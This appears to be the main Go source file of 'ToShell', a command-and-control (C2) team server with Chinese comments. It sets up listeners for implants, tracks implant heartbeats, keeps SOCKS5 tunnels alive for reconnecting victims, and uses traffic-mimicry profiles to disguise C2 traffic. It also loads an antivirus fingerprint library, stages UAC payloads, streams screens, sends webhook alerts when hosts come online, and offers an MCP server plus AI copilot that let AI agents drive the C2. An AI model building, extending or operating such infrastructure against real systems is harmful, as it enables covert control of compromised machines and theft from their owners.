package main

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io/fs"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/spf13/viper"
	"toshell/internal/common/types"
	"toshell/internal/server/agentstore"
	"toshell/internal/server/api"
	"toshell/internal/server/auth"
	"toshell/internal/server/avdetect"
	"toshell/internal/server/config"
	"toshell/internal/server/database"
	"toshell/internal/server/listener"
	"toshell/internal/server/logging"
	mcpsrv "toshell/internal/server/mcp"
	"toshell/internal/server/plugin"
	"toshell/internal/server/session"
	"toshell/internal/server/task"
	"toshell/internal/server/webhook"
)

var (
	// version/commit/buildTime 由构建时 -ldflags 注入（默认 dev 构建）。
	version   = "1.4.0"
	commit    = "dev"
	buildTime = "unknown"
)

// stripRootFS 适配 embed.FS 与 http.FileServer 的路径规范差异。
// http.FileServer 传入以 "/" 开头的路径，而 http.FS(embed.FS) 的 fs.ValidPath
// 校验只接受相对路径（http.FS 仅对 "/" 特判为 "."），故去除前导 "/"；
// 空路径（"/" 去除前缀后）转 "." 以复用 http.FS 的根目录处理。
type stripRootFS struct {
	fsys http.FileSystem
}

func (s *stripRootFS) Open(name string) (http.File, error) {
	name = strings.TrimPrefix(name, "/")
	if name == "" {
		name = "."
	}
	return s.fsys.Open(name)
}

type Server struct {
	config       *config.Config
	db           *database.Database
	sessionMgr   *session.Manager
	taskMgr      *task.Manager
	tcpListener  *listener.TCPListener
	httpListener *listener.HTTPListener
	apiServer    *api.Server
	logger       *logging.Logger
	// mcpServer 对外 MCP（Model Context Protocol）服务端；仅当 config.MCP.Enabled 时非 nil。
	// 它自带监听器（默认 127.0.0.1:18082）与鉴权/限流/审计，执行能力通过 Executor 注入，
	// 因此本包不需要给它加路由。
	mcpServer *mcpsrv.Server
	// agentStore 是 Agent 长任务状态（run/step/tool_call/result）的 sqlite 持久化层；
	// 数据库不可用时为 nil（此时 Agent 仍可跑，但状态不落盘、重启不恢复）。
	agentStore *agentstore.Store
}

func main() {
	cfgPath := flag.String("config", "", "path to config file")
	showVersion := flag.Bool("version", false, "show version information")
	flag.Parse()

	if *showVersion {
		fmt.Printf("ToShell Team Server %s\n", version)
		fmt.Printf("Commit: %s\n", commit)
		fmt.Printf("Build Time: %s\n", buildTime)
		os.Exit(0)
	}

	srv, err := NewServer(*cfgPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to initialize server: %v\n", err)
		os.Exit(1)
	}

	if err := srv.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "Server error: %v\n", err)
		os.Exit(1)
	}
}

func NewServer(cfgPath string) (*Server, error) {
	cfg, err := config.Load(cfgPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load config: %w", err)
	}

	// Auto-generate security credentials on first start
	var configChanged bool

	if cfg.Auth.AdminPassword == "" {
		plainPassword, err := generateRandomPassword(16)
		if err != nil {
			return nil, fmt.Errorf("failed to generate admin password: %w", err)
		}
		hashedPassword, err := auth.HashPassword(plainPassword)
		if err != nil {
			return nil, fmt.Errorf("failed to hash admin password: %w", err)
		}
		cfg.Auth.AdminPassword = hashedPassword
		viper.Set("auth.admin_password", hashedPassword)
		log.Printf("[SECURITY] First start - generated admin password: %s", plainPassword)
		log.Printf("[SECURITY] Store this password securely! It will not be shown again.")
		configChanged = true
	}

	if cfg.Auth.JWTKey == "" {
		jwtKey, err := auth.GenerateRandomKey(32)
		if err != nil {
			return nil, fmt.Errorf("failed to generate JWT key: %w", err)
		}
		cfg.Auth.JWTKey = jwtKey
		viper.Set("auth.jwt_key", jwtKey)
		keyPreview := jwtKey
		if len(keyPreview) > 16 {
			keyPreview = keyPreview[:16]
		}
		log.Printf("[SECURITY] First start - generated JWT key (first 16 chars): %s...", keyPreview)
		configChanged = true
	}

	// 监听加密密钥为空时自动生成 AES-256 密钥，保证首次启动即可用。
	// 注意：AES 密钥以 []byte(EncryptionKey) 的原始字节长度为准，须为 16/24/32 字节，
	// 因此用 24 字节随机数做 base64 编码，得到恰好 32 个可打印字符。
	if cfg.Listener.EncryptionKey == "" {
		raw := make([]byte, 24)
		if _, err := rand.Read(raw); err != nil {
			return nil, fmt.Errorf("failed to generate listener encryption key: %w", err)
		}
		encKey := base64.StdEncoding.EncodeToString(raw) // 24 bytes -> 32 chars
		cfg.Listener.EncryptionKey = encKey
		viper.Set("listener.encryption_key", encKey)
		log.Printf("[SECURITY] First start - generated listener encryption key (AES-256)")
		configChanged = true
	}

	if configChanged {
		// 凭据必须真正落盘：写失败会让每次重启都重新生成随机密码，
		// 用户将被永久锁在门外（历史缺陷：仅打 WARNING 后继续运行）。
		if err := config.Persist(map[string]interface{}{
			"auth.admin_password":     cfg.Auth.AdminPassword,
			"auth.jwt_key":            cfg.Auth.JWTKey,
			"listener.encryption_key": cfg.Listener.EncryptionKey,
		}); err != nil {
			log.Printf("[ERROR] 生成的凭据无法写入配置文件: %v", err)
			log.Printf("[ERROR] 配置路径: %s", config.ConfigPath())
			log.Printf("[ERROR] 请确认该路径可写（或先用 -config 指定可写路径）后重启；")
			log.Printf("[ERROR] 否则每次重启都会重新生成随机密码，导致无法登录。")
			return nil, fmt.Errorf("failed to persist generated credentials to %s: %w", config.ConfigPath(), err)
		}
		log.Printf("[SECURITY] Generated credentials persisted to %s", config.ConfigPath())
	}

	// 启动可观测性：明确告知实际使用的配置与数据库位置，
	// 避免「改了 A 文件、服务端读的是 B 文件」这类排查困难。
	log.Printf("[INFO] [server] using config file: %s", config.ConfigPath())

	logger, err := logging.New(cfg.Logging.Output, cfg.Logging.Level, cfg.Logging.Format)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize logger: %w", err)
	}
	logging.Info("server", "ToShell Team Server v%s starting...", version)

	// 运行时数据目录：确保 data/ 及子目录存在（部分精简/只读环境可能预置缺失，
	// 若此处创建失败会在后续 db/指纹库初始化时给出明确降级提示）。
	ensureDataDirs(cfg)

	db, err := database.New(cfg.Database.Type, cfg.Database.Path)
	if err != nil {
		// 数据库文件打不开（如 data 目录缺失/无写权限/只读环境）：
		// 1) 先尝试自动创建目录后重试一次；
		// 2) 仍失败则回退内存库（volatile），保证服务可跑、接口不因 nil db panic。
		logger.Warn("server", "Failed to initialize database at %s: %v; trying auto-create dir then fallback", cfg.Database.Path, err)
		if dir := filepath.Dir(cfg.Database.Path); dir != "" && dir != "." {
			if mkErr := os.MkdirAll(dir, 0o755); mkErr == nil {
				db, err = database.New(cfg.Database.Type, cfg.Database.Path)
			}
		}
	}
	if err != nil {
		logger.Warn("server", "Database still unavailable (%v); falling back to in-memory database (data lost on restart)", err)
		db, err = database.New("sqlite", "file:tsh_mem?mode=memory&cache=shared")
		if err != nil {
			logger.Warn("server", "In-memory fallback also failed: %v; continuing without persistence", err)
			db = nil
		} else {
			logging.Info("server", "Running on in-memory database (no data/ write access)")
			registerDefaultListener(cfg, db)
		}
	} else {
		logging.Info("server", "Database initialized: %s", cfg.Database.Path)
		registerDefaultListener(cfg, db)
	}

	sessMgr := session.New()
	taskMgr := task.New(sessMgr)

	// ── Agent 存储 + 任务 id 计数器校准（v1.4.0 S2 前置项）──
	// 任务 id 来自内存 atomic 计数器（task.go:143），进程重启即归零 → 会与 tasks 表里的
	// 历史任务撞号（前端/Agent 按 id 查任务就会串到旧记录）。这里把计数器抬到历史最大值之上。
	var agentStore *agentstore.Store
	if db != nil {
		if st, serr := agentstore.New(db.SQL()); serr != nil {
			logging.Warn("server", "Agent 存储初始化失败（长任务状态将不落盘）：%v", serr)
		} else {
			agentStore = st
			if maxID, merr := st.MaxTaskID(); merr != nil {
				logging.Warn("server", "读取历史最大任务 id 失败：%v", merr)
			} else if maxID > 0 {
				taskMgr.SeedTaskCounter(maxID)
				logging.Info("server", "任务 id 计数器已校准到历史最大值 %d（避免重启后撞号）", maxID)
			}
		}
	}

	// 会话心跳超时来自监听器配置（默认 60s）。这里**强制留出余量**（ROADMAP P0-1）：
	// 阈值至少取 MarginFactor(3) 倍植入端心跳间隔。历史上 interval=60s 与
	// heartbeat_timeout=60s 几乎零余量，任何一次心跳迟到（调度抖动/网络排队/休眠唤醒）
	// 都会被判离线，下一次心跳又恢复，前端表现为「离线几秒又在线」抖动。
	// 每个会话还会用实测心跳间隔自适应放宽（见 session.Session.effectiveTimeout）。
	if cfg.Listener.HeartbeatTimeout > 0 {
		session.HeartbeatTimeout = cfg.Listener.HeartbeatTimeout
	}
	heartbeatInterval := time.Duration(cfg.Implant.Interval) * time.Second
	if heartbeatInterval <= 0 {
		heartbeatInterval = 60 * time.Second
	}
	// 会话自适应阈值的起点（载荷可在构建时自定义 interval，实测值会在运行中覆盖它）
	session.DefaultHeartbeatInterval = heartbeatInterval
	if withMargin := time.Duration(session.MarginFactor) * heartbeatInterval; withMargin > session.HeartbeatTimeout {
		logging.Warn("server", "心跳判活阈值 %v 余量不足（植入端心跳间隔 %v），自动放宽为 %v（%d 倍间隔）",
			session.HeartbeatTimeout, heartbeatInterval, withMargin, session.MarginFactor)
		session.HeartbeatTimeout = withMargin
	}
	logging.Info("server", "Session heartbeat timeout: %v (implant interval %v, margin %dx)",
		session.HeartbeatTimeout, heartbeatInterval, session.MarginFactor)

	// 加载服务端安全软件指纹库（data/av_fingerprints.json），供 av_detect 任务结果匹配
	if err := avdetect.Load(); err != nil {
		logging.Warn("server", "Failed to load AV fingerprint library: %v", err)
	} else {
		logging.Info("server", "AV fingerprint library loaded: %s (%d entries)", avdetect.Path(), avdetect.ProcessCount())
	}

	_, err = plugin.Init("plugins")
	if err != nil {
		logging.Warn("server", "Failed to initialize plugin manager: %v", err)
	} else {
		logging.Info("server", "Plugin manager initialized, directory: plugins")
	}

	// 设置默认监听器 ID（与 registerDefaultListener 的 DB 记录一致），
	// 使默认监听器注册的会话带 ListenerID，Web 界面停止/删除默认监听器时
	// 也能通过路由表真实关闭 socket。
	cfg.Listener.ID = fmt.Sprintf("default-%s-%d", cfg.Listener.Host, cfg.Listener.Port)

	tcpListener, err := listener.NewTCPListener(&cfg.Listener, sessMgr, taskMgr)
	if err != nil {
		logging.Error("server", "Failed to create TCP listener: %v", err)
	}

	httpListener, err := listener.NewHTTPListener(&cfg.Listener, sessMgr, taskMgr)
	if err != nil {
		logging.Warn("server", "Failed to create HTTP listener: %v", err)
	}

	apiServer := api.New(cfg, sessMgr, taskMgr)

	// Agent 存储接线（v1.4.0 S2）：把"结果外置索引"落到 agentstore.tool_results，
	// 记录句柄 / sha256 / 字节数 / TTL，供事后追溯与过期回收。未接上（无 DB）时
	// 只是不写索引，结果外置与 result_read 回读照常工作。
	if agentStore != nil {
		apiServer.SetAgentStore(agentStore)
	}

	// 重启恢复（v1.4.0 S2）：进程上次退出时若有 run 停在「等待任务」态（长任务挂起），
	// 这里按 internal_task_id 对齐 tasks 表：任务已完成→接回结果继续；仍在跑→重新订阅；
	// 任务已丢失→给 run 明确终态与中文说明（绝不静默卡在等待态）。
	// 放在 SetAgentStore 之后：恢复要用到 agentstore 的 run/step/tool_call CRUD。
	if agentStore != nil {
		apiServer.StartAgentTaskRecovery()
	}

	// 注入嵌入式前端文件系统（单二进制部署时嵌入 web/dist）。
	// embed.FS 与 http.FileServer 存在路径规范化冲突：FileServer 传入以 "/" 开头的路径，
	// 而 http.FS(embed.FS) 内部会做 fs.ValidPath 校验（要求不以 "/" 开头），
	// 直接使用会导致所有静态资源 404，故用 stripRootFS 适配。
	if subFS, err := fs.Sub(webDistFS, "webdist"); err == nil {
		apiServer.SetWebFS(&stripRootFS{fsys: http.FS(subFS)})
	}

	// Wire up task result callback to broadcast via WebSocket to frontend
	taskResultCallback := func(eventType string, taskID uint64, sessionID string, taskType string, exitCode int32, output string, errorMsg string) {
		// Truncate output for summary
		outputSummary := output
		if len(outputSummary) > 200 {
			outputSummary = outputSummary[:200] + "..."
		}
		apiServer.BroadcastTaskEvent(eventType, taskID, sessionID, taskType, exitCode, outputSummary, errorMsg)
	}

	// 会话上线 webhook 通知（仅上线通知，配置见 configs/server.yaml 的 webhook 段）
	webhookNotifier := webhook.New(&cfg.Webhook)

	if tcpListener != nil {
		tcpListener.SetOnTaskResult(taskResultCallback)
		// C2 闪断/超时很常见，植入体通常会自动重连。
		// 此处不再永久 StopSOCKS5：保留本地 1090 等代理端口，避免浏览器突然失效。
		// 仅在用户主动 DELETE /api/v1/tunnels/{id} 时停止代理。
		tcpListener.SetOnSessionDead(func(sessionID string) {
			fmt.Printf("[INFO] [server] Session %s disconnected (SOCKS5 kept alive for reconnect)\n", sessionID)
			apiServer.BroadcastSessionOffline(sessionID)
		})
		tcpListener.SetOnSessionOnline(func(info *types.SessionInfo) {
			// 只有真实状态变化（首次上线 / 观察窗外的复活）才发上线通知，
			// 避免闪断重连重复推送（广播去抖见 session_broadcast.go）
			if apiServer.BroadcastSessionOnline(info) {
				webhookNotifier.NotifyOnline(info)
			}
		})
		tcpListener.SetOnScreenFrame(apiServer.BroadcastScreenFrame)
	}
	if httpListener != nil {
		httpListener.SetOnTaskResult(taskResultCallback)
		httpListener.SetOnSessionDead(func(sessionID string) {
			fmt.Printf("[INFO] [server] Session %s disconnected (SOCKS5 kept alive for reconnect)\n", sessionID)
			apiServer.BroadcastSessionOffline(sessionID)
		})
		httpListener.SetOnSessionOnline(func(info *types.SessionInfo) {
			if apiServer.BroadcastSessionOnline(info) {
				webhookNotifier.NotifyOnline(info)
			}
		})
	}

	// 优先使用 TCP listener, 回退到 HTTP listener
	if tcpListener != nil {
		apiServer.SetListener(tcpListener)
	} else if httpListener != nil {
		apiServer.SetListener(httpListener)
	}

	// 配置热更新：设置 API 保存或配置文件被外部修改后，
	// 同步应用无需重启即可生效的组件（HTTP listener 拟态模板、AI 副驾驶等）。
	applyHotConfig := func(cfg *config.Config) {
		if cfg == nil {
			return
		}
		if httpListener != nil {
			httpListener.UpdateMimicry(cfg.Listener.MimicryProfile)
		}
		// AI 副驾驶配置热生效（base_url/api_key/model 修改无需重启）
		apiServer.ReconfigureCopilot(cfg.AI)
		logging.Info("server", "配置已热更新并应用 (mimicry=%s)", cfg.Listener.MimicryProfile)
	}
	apiServer.SetOnConfigApplied(applyHotConfig)
	config.OnChange(func(cfg *config.Config) {
		if cfg == nil {
			return
		}
		if httpListener != nil {
			httpListener.UpdateMimicry(cfg.Listener.MimicryProfile)
		}
		apiServer.ReconfigureCopilot(cfg.AI)
		// 这行只在配置**真的应用成功**时才会出现（OnChange 由 Apply 成功路径触发，
		// 而顺序的"读取/解析失败"分支由 config.Reload 打 error 级日志）。
		// v1.4.0 S6 附带修复前，这里写的是"检测到配置文件变化，已自动热重载"，
		// 而热重载失败（配置写坏）时它照样会打 —— 是上一轮排障踩的坑。
		logging.Info("server", "配置变更已应用（热重载成功）(mimicry=%s)", cfg.Listener.MimicryProfile)
	})

	// ── 对外 MCP 服务端（默认关闭；开启时只绑回环 + 必须有 token + 默认只放行只读工具）──
	// 说明：这里**只构造**，真正监听在 Start() 里启动。构造失败不阻断服务端启动
	// （MCP 是可选能力），但会把原因写进日志，避免"配了却没生效"这种最难查的情况。
	var mcpServer *mcpsrv.Server
	if cfg.MCP.Enabled {
		mcpCfg := mcpsrv.Config{
			Enabled:           true,
			Bind:              cfg.MCP.Bind,
			Token:             cfg.MCP.Token,
			AllowedTools:      cfg.MCP.AllowedTools,
			AllowedOrigins:    cfg.MCP.AllowedOrigins,
			AllowedCIDRs:      cfg.MCP.AllowedCIDRs,
			MaxRPM:            cfg.MCP.MaxRPM,
			MaxConcurrent:     cfg.MCP.MaxConcurrent,
			MaxPendingHandles: cfg.MCP.MaxPendingHandles,
			InlineLimit:       cfg.MCP.InlineLimit,
			ResultDir:         cfg.MCP.ResultDir,
			ResultTTL:         cfg.MCP.ResultTTL,
			AuditPath:         cfg.MCP.AuditPath,
			FailClosed:        cfg.MCP.FailClosed,
		}
		if s, err := mcpsrv.New(mcpCfg, apiServer); err != nil {
			logging.Error("mcp", "MCP 服务端初始化失败，本次不启动 MCP：%v", err)
		} else {
			mcpServer = s
			logging.Info("mcp", "MCP 服务端已就绪：bind=%s，放行工具 %d 个（危险级默认不放行）",
				cfg.MCP.Bind, len(s.AllowedTools()))
		}
	}

	return &Server{
		config:       cfg,
		db:           db,
		sessionMgr:   sessMgr,
		taskMgr:      taskMgr,
		tcpListener:  tcpListener,
		httpListener: httpListener,
		apiServer:    apiServer,
		logger:       logger,
		mcpServer:    mcpServer,
		agentStore:   agentStore,
	}, nil
}

func (s *Server) Start() error {
	logging.Info("server", "Starting API server on %s:%d", s.config.Server.APIHost, s.config.Server.APIPort)

	go func() {
		addr := fmt.Sprintf("%s:%d", s.config.Server.APIHost, s.config.Server.APIPort)
		if err := s.apiServer.Start(addr); err != nil {
			logging.Error("server", "API server error: %v", err)
		}
	}()

	// TCP 与 HTTP 监听器共用 cfg.Listener 的同一端口（8080），二者互斥：
	// TCP 启动成功则跳过 HTTP（HTTP 仅作回退），避免 bind 冲突。
	// 启动成功后注册进 API 路由表：Web 界面停止/删除默认监听器时能真实关闭。
	if s.tcpListener != nil {
		if err := s.tcpListener.Start(); err != nil {
			logging.Error("server", "Failed to start TCP listener: %v", err)
			if s.httpListener != nil {
				if err := s.httpListener.Start(); err != nil {
					logging.Error("server", "Failed to start HTTP listener: %v", err)
				} else {
					s.apiServer.RegisterRuntimeListener(s.config.Listener.ID, s.httpListener, s.httpListener.Stop)
				}
			}
		} else {
			s.apiServer.RegisterRuntimeListener(s.config.Listener.ID, s.tcpListener, s.tcpListener.Stop)
		}
	} else if s.httpListener != nil {
		if err := s.httpListener.Start(); err != nil {
			logging.Error("server", "Failed to start HTTP listener: %v", err)
		} else {
			s.apiServer.RegisterRuntimeListener(s.config.Listener.ID, s.httpListener, s.httpListener.Stop)
		}
	}

	// ── 对外 MCP 服务端（可选）──
	// 独立监听器 + 独立 token，不与管理 API 共用鉴权；失败只记日志，不影响 C2 主功能。
	if s.mcpServer != nil {
		mcpSrv := s.mcpServer
		go func() {
			if err := mcpSrv.Start(context.Background()); err != nil {
				logging.Error("mcp", "MCP 服务端退出：%v", err)
			}
		}()
	}

	// 自动恢复 Web 界面创建且标记为 running 的监听器：
	// 这些监听器（非 default-*）重启后 socket 不会自动重建，植入端无法回连。
	// 在默认监听器启动之后异步执行，避免阻塞 API 就绪。
	go func() {
		time.Sleep(2 * time.Second)
		restored := s.apiServer.RestoreRunningListeners()
		if restored > 0 {
			logging.Info("server", "Auto-restored %d listener(s) from database", restored)
		}
	}()

	// cleanupStaleFiles 递归删除指定目录下修改时间超过 maxAge 的普通文件。
	cleanupStaleFiles := func(root string, maxAge time.Duration) {
		_ = filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				return nil
			}
			if d.IsDir() {
				return nil
			}
			info, ierr := d.Info()
			if ierr != nil {
				return nil
			}
			if time.Since(info.ModTime()) > maxAge {
				if rmErr := os.Remove(path); rmErr == nil {
					logging.Info("server", "Cleaned stale temp file: %s", path)
				}
			}
			return nil
		})
	}

	go func() {
		ticker := time.NewTicker(1 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			if s.taskMgr != nil {
				s.taskMgr.CleanupOldTasks(24 * time.Hour)
			}
			// 登录限速表定期清理（过期条目删除，防内存无界增长）
			api.CleanupLoginLimiter()
			// 定期清理上传/下载暂存文件（超过 24h 视为残留），避免服务端磁盘膨胀
			cleanupStaleFiles("data/uploads", 24*time.Hour)
			cleanupStaleFiles("data/transfers", 24*time.Hour)
		}
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	sig := <-sigChan
	logging.Info("server", "Received signal %v, shutting down...", sig)

	return s.Shutdown()
}

func (s *Server) Shutdown() error {
	_, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	if s.tcpListener != nil {
		logging.Info("server", "Shutting down TCP listener...")
		s.tcpListener.Stop()
	}

	if s.httpListener != nil {
		logging.Info("server", "Shutting down HTTP listener...")
		s.httpListener.Stop()
	}

	if s.mcpServer != nil {
		logging.Info("server", "Shutting down MCP server...")
		if err := s.mcpServer.Close(); err != nil {
			logging.Error("server", "Error stopping MCP server: %v", err)
		}
	}

	logging.Info("server", "Shutting down API server...")
	if err := s.apiServer.Stop(); err != nil {
		logging.Error("server", "Error stopping API server: %v", err)
	}

	if s.db != nil {
		logging.Info("server", "Closing database...")
		s.db.Close()
	}

	logging.Info("server", "Server shutdown complete")
	return nil
}

// ensureDataDirs 确保运行时数据目录存在（data/ 及子目录），
// 供 SQLite db、上传/传输暂存、UAC 载荷、工具库使用。
// 目录创建失败不致命：后续各模块会各自降级处理。
func ensureDataDirs(cfg *config.Config) {
	dirs := []string{
		filepath.Dir(cfg.Database.Path), // 默认 ./data
		filepath.Join("data", "uploads"),
		filepath.Join("data", "transfers"),
		filepath.Join("data", "uac"),
		filepath.Join("data", "tools"),
	}
	for _, d := range dirs {
		if d == "" || d == "." {
			continue
		}
		if err := os.MkdirAll(d, 0o755); err != nil {
			logging.Warn("server", "ensureDataDirs: cannot create %s: %v", d, err)
		}
	}
}

// registerDefaultListener registers the listener defined in the config file into the
// database so that it shows up in the listeners page. It uses a stable ID derived from
// the bind address to avoid duplicates across restarts, and only registers when the
// listener is enabled.
func registerDefaultListener(cfg *config.Config, db *database.Database) {
	if db == nil || !cfg.Listener.Enabled {
		return
	}

	id := fmt.Sprintf("default-%s-%d", cfg.Listener.Host, cfg.Listener.Port)

	existing, err := db.ListListeners()
	if err != nil {
		logging.Warn("server", "Failed to list listeners for default registration: %v", err)
		return
	}
	for _, l := range existing {
		if l.ID == id {
			// Already registered; keep its runtime status in sync.
			if l.Status != "running" {
				_ = db.UpdateListenerStatus(id, "running")
			}
			return
		}
	}

	protocol := cfg.Listener.Protocol
	if protocol == "" {
		protocol = "websocket"
	}
	listenerType := "http"
	if protocol == "tcp" {
		listenerType = "tcp"
	}

	info := &types.ListenerInfo{
		ID:         id,
		Name:       "Default Listener",
		Type:       listenerType,
		Protocol:   protocol,
		BindAddr:   cfg.Listener.Host,
		BindPort:   cfg.Listener.Port,
		PublicAddr: cfg.Listener.PublicHost,
		Status:     "running",
		CreatedAt:  time.Now(),
	}
	if err := db.CreateListener(info); err != nil {
		logging.Warn("server", "Failed to register default listener: %v", err)
		return
	}
	logging.Info("server", "Default listener registered: %s:%d (%s)", cfg.Listener.Host, cfg.Listener.Port, protocol)
}

// generateRandomPassword generates a random alphanumeric password of the given length.
func generateRandomPassword(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	for i := range b {
		b[i] = charset[int(b[i])%len(charset)]
	}
	return string(b), nil
}
